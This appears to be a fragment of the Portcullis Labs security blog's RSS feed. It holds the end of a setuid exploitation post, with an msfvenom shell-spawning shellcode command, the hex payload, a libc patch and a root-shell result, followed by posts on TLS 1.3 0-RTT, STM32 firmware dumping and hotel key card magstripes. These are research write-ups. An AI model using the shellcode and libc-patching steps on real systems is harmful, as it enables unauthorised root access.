+<p>I figured I could open up a copy of libc.so.6 in a hex editor and paste in some shellcode over the top of __libc_start_main function. No matter how horribly I corrupted the file or how badly it crashed after it executed my shellcode, at least I&#8217;d have my shell.</p>
+<p>I grabbed some shellcode off the internet &#8211; but equally could have generated in it Metasploit like this (I also appended a call to exit to stop the inevitable crash I mentioned):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ msfvenom -a x64 -f hex -p linux/x64/exec CMD=/bin/sh AppendExit=true
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 55 bytes
+Final size of hex file: 110 bytes
+6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8080000002f62696e2f73680056574889e60f054831ff6a3c580f05
+</pre>
+<p>Then I made a copy of libc.so.6 and located the file offset for the __libc_start_main function:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cp /lib/x86_64-linux-gnu/libc.so.6 .
+$ objdump -FD libc.so.6 | grep _main
+00000000000201f0 &lt;__libc_start_main@@GLIBC_2.2.5&gt; (File Offset: 0x201f0):
+...
+</pre>
+<p>Using a hexeditor I pasted in the shellcode.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">&lt;/span&gt;
+&lt;pre&gt;$ hexedit libc.so.6
+</pre>
+<div id="attachment_6591" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6582"><div class="lb-album"><a href="#image-6582"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181649-300x37.png" alt="Use CTRL-G to seek to the offset in the file" class="size-medium wp-image-6591"><span></span></a></div>              
+<a href="#imageclose-6582" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6582">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181649.png" alt="image-6582">
+                   </div></a><p class="wp-caption-text">Use CTRL-G to seek to the offset in the file</p></div>
+<p>(CTRL-G to go to an offset (0x201f0); paste in our shellcode; F2 to save; CTRL-C to quit.)</p>
+<div id="attachment_6592" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6583"><div class="lb-album"><a href="#image-6583"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181927-300x115.png" alt="Shellcode pasted over existing code" class="size-medium wp-image-6592"><span></span></a></div>              
+<a href="#imageclose-6583" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6583">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181927.png" alt="image-6583">
+                   </div></a><p class="wp-caption-text">Shellcode pasted over existing code</p></div>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./arp-ath
+# id
+uid=1000(x) gid=1000(x) euid=0(root) groups=1000(x)
+</pre>
+<p>Finally! <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<h2>And this works on AIX too?</h2>
+<p>I tried to get this working on AIX &#8211; which typically doesn&#8217;t have a C compiler available; AND typically has loads of RPATH vulnerabilities. However, the shellcode I tried was self-modifying. This is fine when you&#8217;re injecting shellcode as data, but the code section I was injecting into was read-only. So I got a segfault. I&#8217;ll follow up if get this working.</p>
+<h2>Conclusion</h2>
+<p>The quick and dirty solution, while inevitably unsatisfactory is sometimes sufficient. Especially given the lack of tools, source, time you might have when exploiting this sort of vulnerabilities. Maybe it&#8217;s not a terrible solution. You be the judge.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Playback: A TLS 1.3 story</title>
+		<link>https://labs.portcullis.co.uk/blog/playback-a-tls-1-3-story/</link>
+		<comments>https://labs.portcullis.co.uk/blog/playback-a-tls-1-3-story/#comments</comments>
+		<pubDate>Wed, 08 Aug 2018 14:00:00 +0000</pubDate>
+		<dc:creator><![CDATA[AGA]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[Black Hat USA]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[DEF CON]]></category>
+		<category><![CDATA[MiTM]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6776</guid>
+		<description><![CDATA[<p>Secure communications are one of the most important topics in information security and the Transport Layer Security (TLS) protocol is currently the most used protocol to provide secure communications on Internet. For example, when you are connecting to your online banking application, your favorite instant message application or social networks, all those communications are being [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/playback-a-tls-1-3-story/">Playback: A TLS 1.3 story</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Secure communications are one of the most important topics in information security and the Transport Layer Security (TLS) protocol is currently the most used protocol to provide secure communications on Internet. For example, when you are connecting to your online banking application, your favorite instant message application or social networks, all those communications are being transmitted using TLS. With TLS the information sent by the browser and the service is secured and encrypted, meaning that the information cannot be modified or tampered with by an attacker. Moreover the communications are verified to ensure that the browser is connected to the right endpoint (e.g. Wikipedia).<span id="more-6776"></span></p>
+<p>TLS was born as a substitute of the ancient Secure Sockets Layer (SSL) protocol, which was showing its age and being susceptible to multiple attacks. The first version of TLS, 1.0, was created in 1999 and it was based on SSLv3. Since then TLS 1.1 (2006) and TLS 1.2 (2008) were created to improve previous versions of the protocol, solving some of the security weaknesses that security researchers discovered in the last two decades. </p>
+<p>TLS 1.3 is the new protocol version. It is not officially released yet, but it is in the final stage, just waiting for the final approval. In any case, some important vendors and open source projects are currently supporting it. The TLS 1.3 Working Group released multiple iterations (drafts) that refined and improved the protocol in the last four years. One of the outcomes of that hard work is that TLS 1.3 has been simplified compared to previous versions of the protocol and it is not vulnerable to previous known attacks that were affecting previous versions. For example, in TLS 1.2 the number of ciphers supported was high, maybe there were too many, and the Working Group has decided to limit this new version to support only five ciphers. Another example is that with TLS 1.3, forward secrecy is not optional, so, in the case that an attacker manages to steal the private keys of one server, he will not be able to decrypt previous communications as he would not be able to obtain the session keys used to encrypt previous messages.</p>
+<p>TLS 1.3 has also introduced a new feature to improve the performance for new connections. The name of this feature is 0-RTT (Zero Round Trip Time Resumption) and it allows to have a fast session resumption that can push data to the server without needing to wait for a server confirmation. This is possible as 0-RTT reuses cryptographic information obtained in the first connection to the server. The following diagram shows how TLS 1.3 0-RTT resumption works:</p>
+<div id="attachment_6778" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6777"><div class="lb-album"><a href="#image-6777"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/08/0rtt_handshake_99_full_white_background-300x202.png" alt="0RTT handshake state diagram" class="size-medium wp-image-6778"><span></span></a></div>              
+<a href="#imageclose-6777" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6777">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/08/0rtt_handshake_99_full_white_background.png" alt="image-6777">
+                   </div></a><p class="wp-caption-text">0RTT handshake state diagram</p></div>
+<p>This is an interesting functionality from the point of view of the performance, but it has some known security implications.  </p>
+<p>Cisco security consultants <a title="Alfonso Garcia Alguacil" href="https://labs.portcullis.co.uk/author/aga/">Alfonso Garcia Alguacil</a> and <a title="Alejo Murillo Moya" href="https://labs.portcullis.co.uk/author/amm/">Alejo Murillo Moya</a> will deliver a presentation about some of the known security implications of using 0-RTT and will show Proof of Concepts (PoCs) of some attacks in real world environments. The intent is to raise awareness across the security community about that new feature. The presentation is named &#8220;Playback: A TLS 1.3 story&#8221; and it will be presented at <a title="Black Hat USA 18" href="https://www.blackhat.com/us-18/briefings.html#playback-a-tls-1.3-story">Black Hat USA 18</a> and <a href="https://www.defcon.org/html/defcon-26/dc-26-speakers.html#García">DEF CON 26</a>. Attendees will learn about TLS 1.3 0-RTT, see some examples about how an attacker could take advantage of that new feature and finally get an understanding of the security implications of enabling the featu</re and how it could be used safely minimizing any potential security impacts.</p>
+<p>You can find the slides and tool from this presentation here:</p>
+<ul>
+<li><a title="Playback: A TLS 1.3 story" href="/presentations/playback-a-tls-1-3-story-2/">Playback: A TLS 1.3 story</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/playback-a-tls-1-3-story/">Playback: A TLS 1.3 story</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/playback-a-tls-1-3-story/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Grabbing firmware from my cheap STM32-based magstripe reader (using ST-Link v2)</title>
+		<link>https://labs.portcullis.co.uk/blog/grabbing-firmware-from-my-cheap-stm32-based-magstripe-reader-using-st-link-v2/</link>
+		<comments>https://labs.portcullis.co.uk/blog/grabbing-firmware-from-my-cheap-stm32-based-magstripe-reader-using-st-link-v2/#comments</comments>
+		<pubDate>Fri, 20 Jul 2018 08:00:27 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardhack]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6583</guid>
+		<description><![CDATA[<p>In my previous post, I worked around the fact that the card reader could only read credit cards &#8211; when I wanted to read other types of magstripes. I&#8217;d thought at the time that it would theoretically be possible to replace the firmware. In this post I don&#8217;t get as far as writing new firmware, [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/grabbing-firmware-from-my-cheap-stm32-based-magstripe-reader-using-st-link-v2/">Grabbing firmware from my cheap STM32-based magstripe reader (using ST-Link v2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In my <a title="previous post" href="/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/">previous post</a>, I worked around the fact that the card reader could only read credit cards &#8211; when I wanted to read other types of magstripes. I&#8217;d thought at the time that it would theoretically be possible to replace the firmware. In this post I don&#8217;t get as far as writing new firmware, but I to present an easy way to download and upload firmware: The ST-Link v2 USB device (hardware) and associated ST-Link Utility (software).<span id="more-6583"></span></p>
+<h2>Inspiration</h2>
+<p>I&#8217;d been watching YouTube videos about microcontrollers, when I stumbled across <a title="How to Set up the ST-Link v2 Programmer Tutorial for ARM Microcontrollers" href="https://www.youtube.com/watch?v=QgC_6R1_R-o">How to Set up the ST-Link v2 Programmer Tutorial for ARM Microcontrollers</a>. I hadn&#8217;t come across this method of programming microcontrollers before. Previously, I&#8217;d only programmed my Arduino via UART.</p>
+<p>I got straight on eBay and bought a programmer from a local supplier, so it would arrive quickly. The same thing is also available for about £2 from China.</p>
+<div id="attachment_6608" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6584"><div class="lb-album"><a href="#image-6584"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/stlink1-300x300.png" alt="ST-Link v2 on eBay" class="size-medium wp-image-6608"><span></span></a></div>              
+<a href="#imageclose-6584" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6584">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/stlink1.png" alt="image-6584">
+                   </div></a><p class="wp-caption-text">ST-Link v2 on eBay</p></div>
+<h2>Pinout</h2>
+<p>The chip I wanted to program/read was the STM32F102C8 from my cheap magstripe reader:</p>
+<div id="attachment_6601" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6585"><div class="lb-album"><a href="#image-6585"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chip-300x228.jpg" alt="Chip on card reader" class="size-medium wp-image-6601"><span></span></a></div>              
+<a href="#imageclose-6585" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6585">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chip.jpg" alt="image-6585">
+                   </div></a><p class="wp-caption-text">Chip on card reader</p></div>
+<p>The <a title="datasheet (pdf)" href="http://www.st.com/resource/en/datasheet/stm32f102c8.pdf">datasheet (pdf)</a> showed the pinout information I needed:</p>
+<div id="attachment_6602" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6586"><div class="lb-album"><a href="#image-6586"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pinout-300x168.png" alt="Pinout from STM32 datasheet" class="size-medium wp-image-6602"><span></span></a></div>              
+<a href="#imageclose-6586" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6586">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pinout.png" alt="image-6586">
+                   </div></a><p class="wp-caption-text">Pinout from STM32 datasheet</p></div>
+<p>The pins I needed to locate were the Serial Wire Debug (SWD) pins. Specifically SWDIO and SWCLK:</p>
+<div id="attachment_6605" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6587"><div class="lb-album"><a href="#image-6587"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pins-300x100.png" alt="Locations of SWDIO/SWCLK pins" class="size-medium wp-image-6605"><span></span></a></div>              
+<a href="#imageclose-6587" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6587">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pins.png" alt="image-6587">
+                   </div></a><p class="wp-caption-text">Locations of SWDIO/SWCLK pins</p></div>
+<p>Marking up the previous diagrams, we have identified the pins we need:</p>
+<div id="attachment_6603" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6588"><div class="lb-album"><a href="#image-6588"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pinout-markup-300x168.png" alt="Location of the pins we need" class="size-medium wp-image-6603"><span></span></a></div>              
+<a href="#imageclose-6588" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6588">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/pinout-markup.png" alt="image-6588">
+                   </div></a><p class="wp-caption-text">Location of the pins we need</p></div>
+<div id="attachment_6610" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6589"><div class="lb-album"><a href="#image-6589"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chip-Copy-Copy-300x227.jpg" alt="Pin locations marked" class="size-medium wp-image-6610"><span></span></a></div>              
+<a href="#imageclose-6589" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6589">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chip-Copy-Copy.jpg" alt="image-6589">
+                   </div></a><p class="wp-caption-text">Pin locations marked</p></div>
+<p>In case you&#8217;re wondering, if you connect your oscilloscope to the SWDIO and SWCLK pins while the device is powered up, you don&#8217;t see any signals. But this doesn&#8217;t mean the pins are disabled &#8211; as we&#8217;ll show below.</p>
+<h2>Soldering</h2>
+<p>After successfully soldering some enamelled copper wire to the pins, then almost ripping the pins off accidentally, I used some hot clue as strain relief. The other end of the wire was connected to some 0.1&#8243; headers so I could use dupont cables to connect to the ST-Link.</p>
+<div id="attachment_6612" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6590"><div class="lb-album"><a href="#image-6590"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/fine-300x115.jpg" alt="Connections soldered to pins" class="size-medium wp-image-6612"><span></span></a></div>              
+<a href="#imageclose-6590" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6590">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/fine.jpg" alt="image-6590">
+                   </div></a><p class="wp-caption-text">Connections soldered to pins</p></div>
+<p>I was pretty pleased with my soldering as it was the first time I&#8217;d soldered to pins with such fine pitch. I found that by tinning the wire very slightly, then resting the wire on the pin as I gently lowered the soldering iron (no solder on the iron), I was able to avoid spreading solder onto the nearby pins.</p>
+<h2>Connecting to ST-Link</h2>
+<p>Using dupont connectors we need to make 3 connections between the ST-Link device and the target board: SWDIO, SWCLK and Ground. The ST-Link clearly labels the various pins:</p>
+<div id="attachment_6622" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6591"><div class="lb-album"><a href="#image-6591"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/st-300x189.jpg" alt="ST-Link and magstripe reader connected" class="size-medium wp-image-6622"><span></span></a></div>              
+<a href="#imageclose-6591" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6591">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/st.jpg" alt="image-6591">
+                   </div></a><p class="wp-caption-text">ST-Link and magstripe reader connected</p></div>
+<p>Below the required connections have been made using the Black (SWDIO), Grey (SWCLK) and White (ground) connectors &#8211; though it&#8217;s hard to see and a bit confusing because of all the unrelated wires:</p>
+<div id="attachment_6623" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6592"><div class="lb-album"><a href="#image-6592"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/st3-300x213.jpg" alt="Relevant connections highlighted between ST-Link and target" class="size-medium wp-image-6623"><span></span></a></div>              
+<a href="#imageclose-6592" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6592">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/st3.jpg" alt="image-6592">
+                   </div></a><p class="wp-caption-text">Relevant connections highlighted between ST-Link and target</p></div>
+<p>Now we just need to load up the software and connect using the button shown below:</p>
+<div id="attachment_6620" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6593"><div class="lb-album"><a href="#image-6593"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/0connect-to-target-300x148.png" alt="Connect button" class="size-medium wp-image-6620"><span></span></a></div>              
+<a href="#imageclose-6593" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6593">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/0connect-to-target.png" alt="image-6593">
+                   </div></a><p class="wp-caption-text">Connect button</p></div>
+<p>Then we can read the firmware. I tweaked the start address and length to values that seemed to get me the whole firmware. The start address can be either 0&#215;00000000 or 0&#215;8000000:</p>
+<div id="attachment_6621" style="width: 283px" class="wp-caption alignnone"><a name="imageclose-6594"><div class="lb-album"><a href="#image-6594"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/1read-273x300.png" alt="Successful Firmware Read" class="size-medium wp-image-6621"><span></span></a></div>              
+<a href="#imageclose-6594" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6594">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/1read.png" alt="image-6594">
+                   </div></a><p class="wp-caption-text">Successful firmware read</p></div>
+<p>To save to a file (always good to have a backup), use the button shown:</p>
+<div id="attachment_6615" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6595"><div class="lb-album"><a href="#image-6595"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/2save-300x91.png" alt="Save Firmware To a .bin file" class="size-medium wp-image-6615"><span></span></a></div>              
+<a href="#imageclose-6595" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6595">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/2save.png" alt="image-6595">
+                   </div></a><p class="wp-caption-text">Save firmware to a .bin File</p></div>
+<p>Once the file has been saved, it can be written back using the &#8220;Program Verify&#8221; button:</p>
+<div id="attachment_6617" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6596"><div class="lb-album"><a href="#image-6596"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/4program-300x92.png" alt="Button to Program Target with a Local .bin File" class="size-medium wp-image-6617"><span></span></a></div>              
+<a href="#imageclose-6596" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6596">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/4program.png" alt="image-6596">
+                   </div></a><p class="wp-caption-text">Button to program target with a local .bin File</p></div>
+<div id="attachment_6618" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6597"><div class="lb-album"><a href="#image-6597"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/5program2-300x205.png" alt="Programming Options" class="size-medium wp-image-6618"><span></span></a></div>              
+<a href="#imageclose-6597" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6597">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/5program2.png" alt="image-6597">
+                   </div></a><p class="wp-caption-text">Programming options</p></div>
+<p>After writing, I reset the magstripe reader to check it still worked. It did.</p>
+<p>So, with very little effort we were able to read and write firmware to the device.</p>
+<h2>Conclusion</h2>
+<p>YouTube videos can be educational as well as fun. Sometimes, reading the firmware can be a lot easier than you&#8217;d ever expect. Checking if pins are active using only an oscilloscope wasn&#8217;t appropriate in this instance. We actually needed to try communicating with the device.</p>
+<h2>Where next?</h2>
+<p>If I was minded to create something rather than to take things apart all the time, I&#8217;d probably connect the STM32 to my Arduino software and see if I could write a sketch to read the input pins that connect to the magnetic read heads (via the op amps). Then I&#8217;d figure out to do HID emulation (as the original firmware did) so I could read arbitrary magstripes rather than just payment cards.</p>
+<p>I got as far as tracing out the 3 input pins using the continuity testing feature on my multimeter.</p>
+<p>I was also interested to know if I could have figured out the input pins from looking at the firmware. I loaded up the firmware in Hopper &#8211; which was surprisingly easy. But haven&#8217;t yet understood it to the extent where I could figure out input pins used. Apparently the assembler code to read of each pin is pretty distinctive, so this certainly seems possible to search for &#8211; once you&#8217;ve understood the datasheet enough to know what to search for exactly. Checkout 4m30s onwards in this <a title="LiveOverflow YouTube video" href="https://www.youtube.com/watch?v=hyoPAOTrUMc">LiveOverflow YouTube video</a>.</p>
+<p>It might be possible to write some nefarious firmware that seems to operate as normal, but secretly logs card numbers to the internal flash. Alternatively, maybe it just waits until midnight before it plays a load of malicious keystrokes to the host computer. Or maybe it only plays malicious keystrokes out when an attacker&#8217;s creditcard is swiped.</p>
+<p>You might want to check out the <a title="stm32duino / Blue Pill" href="http://wiki.stm32duino.com/index.php?title=Blue_Pill">stm32duino / Blue Pill</a>, which uses the same family of microprocessors and the <a title="Pill Duck" href="https://github.com/satoshinm/pill_duck">Pill Duck</a> project which is essentially a <a title="USB Rubber Ducky" href="https://hakshop.com/products/usb-rubber-ducky-deluxe">USB Rubber Ducky</a> type device that uses the Blue Pill hardware. Take care when Googling for blue pills, though.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/grabbing-firmware-from-my-cheap-stm32-based-magstripe-reader-using-st-link-v2/">Grabbing firmware from my cheap STM32-based magstripe reader (using ST-Link v2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/grabbing-firmware-from-my-cheap-stm32-based-magstripe-reader-using-st-link-v2/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Reading hotel key cards with a credit card magstripe reader</title>
+		<link>https://labs.portcullis.co.uk/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/</link>
+		<comments>https://labs.portcullis.co.uk/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/#comments</comments>
+		<pubDate>Wed, 04 Jul 2018 06:01:58 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardhack]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6481</guid>
+		<description><![CDATA[<p>In this post I describe how my cheap magstripe reader wouldn&#8217;t read all magstripes, only credit/debit cards. This did nothing to help me understand what data was on my hotel key card &#8211; which is what I really wanted to know. Rather than take the obvious next step or buying a better reader, I opted [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/">Reading hotel key cards with a credit card magstripe reader</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post I describe how my cheap magstripe reader wouldn&#8217;t read all magstripes, only credit/debit cards. This did nothing to help me understand what data was on my hotel key card &#8211; which is what I really wanted to know. Rather than take the obvious next step or buying a better reader, I opted to open up the cheap magstripe reader, probed around a bit and found a way to read the raw data off the hotel magstripes. What that data means remains a mystery so there may be a part 2 at some stage.<span id="more-6481"></span></p>
+<h2>About my magstripe reader</h2>
+<p>I bought the following reader for £11.85 in 2017:</p>
+<div id="attachment_6519" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6482"><div class="lb-album"><a href="#image-6482"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/myreader1-300x254.png" alt="Cheap reader from eBay" class="size-medium wp-image-6519"><span></span></a></div>              
+<a href="#imageclose-6482" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6482">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/myreader1.png" alt="image-6482">
+                   </div></a><p class="wp-caption-text">Cheap reader from eBay</p></div>
+<p>It connects via USB and is detected as a keyboard. If you swipe a credit/debit card through the reader, the corresponding data from the magstripe will appear if your text editor as if it had been typed. If you don&#8217;t have a text editor open at the time, you&#8217;ll get the effect of whatever the keystrokes on the magstripe reader are!</p>
+<p>It works fine under both Windows and Linux. But only for credit/debit cards. When I swiped a hotel key card through, I got no data at all.</p>
+<h2>Why not just get a different reader?</h2>
+<p>I could have taken a couple of different (and no doubt better) approaches to this project. Finding a better magstripe reader was one option. Googling around to better understand hotel magstripes would have no-doubt been fruitful, but potentially spoils some of problem solving. I can always google later when I&#8217;m properly stuck. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>I since invested in an MSR605X reader/writer. I haven&#8217;t played with it much yet, but it is able to do raw reads. I&#8217;ll probably cover this reader in a future post.</p>
+<h2>Plan for the cheap reader</h2>
+<p>I figured that the magnetic read head in the cheap reader would almost certainly be able to read the data from from hotel cards or any other card with a magstripe. But the rest of the reader was only able to interpret payment card data. If I could probe the electrical signals in the right place within the reader, I should be able to see the 1&#8242;s and 0&#8242;s on the magstripe.</p>
+<div id="attachment_6520" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6483"><div class="lb-album"><a href="#image-6483"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readhead-300x160.png" alt="Magnetic read head inside card reader" class="size-medium wp-image-6520"><span></span></a></div>              
+<a href="#imageclose-6483" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6483">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readhead.png" alt="image-6483">
+                   </div></a><p class="wp-caption-text">Magnetic read head inside card reader</p></div>
+<p>I was a vague plan and certainly not the path of least resistance, but would ultimately work&#8230;</p>
+<h2>Probing around</h2>
+<p>I had two tools at my disposal to probe with (this was a home-based side project as opposed to an office-based project):</p>
+<ul>
+<li>A cheap handheld Oscilloscope (Sainsmart DS202)</li>
+<li>A Saleae logic analyzer</li>
+</ul>
+<p>I quickly realized there were 7 points on the read head I could attach probes to.</p>
+<div id="attachment_6521" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6484"><div class="lb-album"><a href="#image-6484"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadback-300x149.png" alt="Connection points on back of read head" class="size-medium wp-image-6521"><span></span></a></div>              
+<a href="#imageclose-6484" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6484">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadback.png" alt="image-6484">
+                   </div></a><p class="wp-caption-text">Connection points on back of read head</p></div>
+<p>I figured if hooked the read head directly up to my scope, I&#8217;d be able to see an analogue signal when I swiped a card. Ultimately I hoped to do something with said signal to get the data I wanted.</p>
+<div id="attachment_6522" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6485"><div class="lb-album"><a href="#image-6485"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadsoldered-300x178.png" alt="Connections for scope soldered directly to read head" class="size-medium wp-image-6522"><span></span></a></div>              
+<a href="#imageclose-6485" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6485">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadsoldered.png" alt="image-6485">
+                   </div></a><p class="wp-caption-text">Connections for scope soldered directly to read head</p></div>
+<p>I tried hooking up various pairs from these 7 probe points to my scope, but didn&#8217;t find any signal at all. Maybe the signal&#8217;s too weak, or maybe (in retrospect) I did a rubbish job of identifying a suitable ground.</p>
+<p>By this point I&#8217;d started googling the chip numbers. There were 2 x Op Amps and 1 x Analogue Comparator:</p>
+<ul>
+<li>2 x <a title="LM2902DG" href="https://www.mouser.co.uk/ProductDetail/ON-Semiconductor/LM2902DG">LM2902DG</a> (Op Amp)</li>
+<li>1 x <a title="LM2901DG" href="https://www.mouser.co.uk/ProductDetail/ON-Semiconductor/LM2901DG">LM2901DG</a> (Analogue Comparator)</li>
+</ul>
+<div id="attachment_6523" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6486"><div class="lb-album"><a href="#image-6486"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips1-300x105.png" alt="2 x Op Amps" class="size-medium wp-image-6523"><span></span></a></div>              
+<a href="#imageclose-6486" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6486">
